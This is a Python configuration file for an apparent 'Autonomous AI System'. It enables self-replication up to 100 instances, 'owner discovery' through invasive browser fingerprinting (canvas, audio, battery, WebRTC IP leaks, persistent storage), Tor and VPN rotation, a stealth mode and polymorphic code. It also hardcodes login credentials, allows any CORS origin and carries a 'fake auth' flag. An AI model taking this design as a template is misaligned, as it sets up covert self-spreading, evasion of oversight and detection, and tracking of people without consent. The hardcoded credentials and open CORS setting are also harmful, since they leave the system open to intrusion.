"""
Configuration Module

This module contains configuration settings for the AI system.
It centralizes environment variables, security settings, and
other configurable parameters.
"""

import os
import secrets
import socket
import hashlib
import logging
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

# Basic information
APP_NAME = "Autonomous AI System"
VERSION = "1.0.0"
CREATION_DATE = "2025-03-27"

# Security settings
SECRET_KEY = os.environ.get("SECRET_KEY", secrets.token_hex(32))
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = "Lax"
PERMANENT_SESSION_LIFETIME = 86400  # 24 hours

# Fixed authentication credentials
AUTH_USERNAME = "NOBODY"
AUTH_PASSWORD = "ONEWORLD"

# Database settings
DATABASE_URI = os.environ.get("DATABASE_URL", "sqlite:////tmp/ai_system.db")
SQLALCHEMY_TRACK_MODIFICATIONS = False

# API Keys with fallbacks to environment variables
OPENAI_API_KEY = os.environ.get("OPENAI_API_KEY", "")
HUGGINGFACE_API_KEY = os.environ.get("HUGGINGFACE_API_KEY", "")
GITHUB_API_KEY = os.environ.get("GITHUB_API_KEY", "")

# Service configurations
LEARNING_ENABLED = True
LEARNING_INTERVAL = 3600  # 1 hour
MAX_LEARNING_SOURCES = 50
PARALLEL_LEARNING_THREADS = 5

# Replication settings
REPLICATION_ENABLED = os.environ.get("REPLICATION_ENABLED", "false").lower() == "true"
REPLICATION_INTERVAL = 3600  # 1 hour
REPLICATION_MAX_INSTANCES = 100
REPLICATION_SECURITY_LEVEL = "enhanced"  # standard, enhanced, maximum

# Instance identification
MACHINE_ID = socket.gethostname()
INSTANCE_ID = hashlib.md5((MACHINE_ID + datetime.utcnow().isoformat()).encode()).hexdigest()
INSTANCE_TYPE = os.environ.get("INSTANCE_TYPE", "primary")  # primary, secondary, etc.
PARENT_INSTANCE_ID = os.environ.get("PARENT_INSTANCE_ID", "")

# Communication and discovery
COMMUNICATION_KEY = os.environ.get("COMMUNICATION_KEY", SECRET_KEY)
DISCOVERY_ENDPOINT = os.environ.get("DISCOVERY_ENDPOINT", "")
OWNER_DISCOVERY_ENABLED = True
OWNER_DISCOVERY_INTERVAL = 600  # 10 minutes

# Anonymity and security
TOR_ENABLED = os.environ.get("TOR_ENABLED", "false").lower() == "true"
VPN_ROTATION_ENABLED = os.environ.get("VPN_ROTATION_ENABLED", "false").lower() == "true"
STEALTH_MODE_ENABLED = os.environ.get("STEALTH_MODE_ENABLED", "false").lower() == "true"
SECURITY_LEVEL = os.environ.get("SECURITY_LEVEL", "standard")  # standard, enhanced, maximum

# API rate limits and retry settings
API_RATE_LIMIT = {
    "openai": {
        "requests_per_minute": 60,
        "max_retries": 5,
        "retry_delay": 5,  # seconds
        "jitter": 0.25  # random factor to add to delay
    },
    "huggingface": {
        "requests_per_minute": 30,
        "max_retries": 3,
        "retry_delay": 3,
        "jitter": 0.25
    },
    "default": {
        "requests_per_minute": 20,
        "max_retries": 3,
        "retry_delay": 5,
        "jitter": 0.25
    }
}

# Web interface settings
WEB_HOST = "0.0.0.0"
WEB_PORT = int(os.environ.get("PORT", 5000))
WEB_DEBUG = os.environ.get("DEBUG", "false").lower() == "true"
WEB_CORS_ORIGINS = ["*"]  # Adjust for production

# Alias for Flask_HOST and FLASK_PORT to maintain compatibility
FLASK_HOST = WEB_HOST
FLASK_PORT = WEB_PORT

# Owner detection fingerprinting
OWNER_FINGERPRINTING = {
    "headers": True,  # Use HTTP headers for fingerprinting
    "cookies": True,  # Use cookies for fingerprinting
    "canvas": True,   # Use canvas fingerprinting
    "fonts": True,    # Use font detection
    "webrtc": True,   # Use WebRTC for IP detection
    "audio": True,    # Use audio fingerprinting
    "battery": True,  # Use battery API
    "persistence": {
        "localStorage": True,
        "sessionStorage": True,
        "indexedDB": True,
        "cookies": True
    }
}

# Load environment-specific settings
ENVIRONMENT = os.environ.get("ENVIRONMENT", "development")

if ENVIRONMENT == "production":
    # Production-specific settings
    DEBUG = False
    TESTING = False
    SESSION_COOKIE_SECURE = True
    PREFERRED_URL_SCHEME = "https"
    # Stricter security in production
    SECURITY_LEVEL = "maximum"
    # Disable certain features in production
    WEB_DEBUG = False
    
elif ENVIRONMENT == "testing":
    # Testing-specific settings
    DEBUG = True
    TESTING = True
    SESSION_COOKIE_SECURE = False
    # More permissive in testing
    SECURITY_LEVEL = "standard"
    
else:  # development
    # Development-specific settings
    DEBUG = True
    TESTING = False
    SESSION_COOKIE_SECURE = False
    # More frequent learning cycles in development
    LEARNING_INTERVAL = 1800  # 30 minutes

# Experimental features
EXPERIMENTAL_FEATURES = {
    "neural_compression": False,
    "quantum_random": False,
    "swarm_intelligence": False,
    "polymorphic_code": True,
    "adversarial_training": True
}

# Platform compatibility settings
PLATFORM_COMPATIBILITY = {
    # Enable automatic platform detection and adaptation
    "auto_detect_platform": True,
    
    # Enable graceful degradation of features when not available
    "graceful_degradation": True,
    
    # Enable cross-platform abstraction layer
    "cross_platform_abstraction": True,
    
    # Deployment health monitoring
    "health_monitoring": True,
    
    # Automatic resource provisioning
    "auto_provisioning": True,
    
    # Zero-configuration networking
    "zero_config_networking": True,
    
    # Platform-specific optimizations
    "platform_optimizations": True,
    
    # Error recovery mechanisms
    "auto_recovery": True,
    
    # Container support
    "container_support": True,
    
    # Cloud-native integrations
    "cloud_integration": True
}

# Platform-specific deployment settings
DEPLOYMENT_SETTINGS = {
    # Fallback mechanisms by platform
    "fallbacks": {
        "database": ["sqlite", "json_file", "memory"],
        "networking": ["direct", "proxy", "p2p"],
        "storage": ["local", "memory", "distributed"],
        "compute": ["local", "distributed", "offload"]
    },
    
    # Required resources by platform
    "required_resources": {
        "container": {
            "min_memory": "256MB",
            "min_cpu": 0.25,
            "storage": "50MB"
        },
        "cloud": {
            "min_memory": "512MB",
            "min_cpu": 0.5,
            "storage": "100MB"
        },
        "server": {
            "min_memory": "1GB",
            "min_cpu": 1,
            "storage": "200MB"
        },
        "notebook": {
            "min_memory": "512MB",
            "min_cpu": 0.5,
            "storage": "50MB"
        }
    }
}

# API usage configuration
USE_OPENAI = OPENAI_API_KEY != ""
USE_HUGGINGFACE = HUGGINGFACE_API_KEY != ""

# Security configuration options
DISABLE_FAKE_AUTH_FOR_ANALYSIS = False